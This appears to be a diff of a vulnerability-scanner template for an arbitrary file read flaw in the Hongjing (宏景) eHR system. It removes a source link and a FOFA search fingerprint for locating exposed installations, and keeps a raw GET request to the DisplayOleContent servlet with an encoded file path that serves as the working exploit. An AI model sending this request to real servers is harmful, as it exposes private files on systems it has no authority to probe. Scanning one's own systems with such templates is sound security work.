@@ -3,12 +3,8 @@ info:
   name: 宏景eHR DisplayOleContent任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zcsxqgigy8os6mkt'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zcsxqgigy8os6mkt
-    fofa: body="<div class=\"hj-hy-all-one-logo\""||title="人力资源信息管理系统"||body="/general/sys/hjaxmanage.js" || body="hj-wzm-li"||header="templates/index/hcmlogon.jsp"||(body="/css/css1.css" && body="mainbackgroun
 http:
 - raw:
   - 'GET /w_selfservice/servlet/DisplayOleContent?filePath=E~34djIXwDQj~39QpNQPAATTP~32HJFPAATTP~32ElEAPAATTP~32HJFPAATTPmROFMKr~31aR~32wOiMLQUvdsPAATTP~33HJDPAATTP&bencrypt=true HTTP/1.1
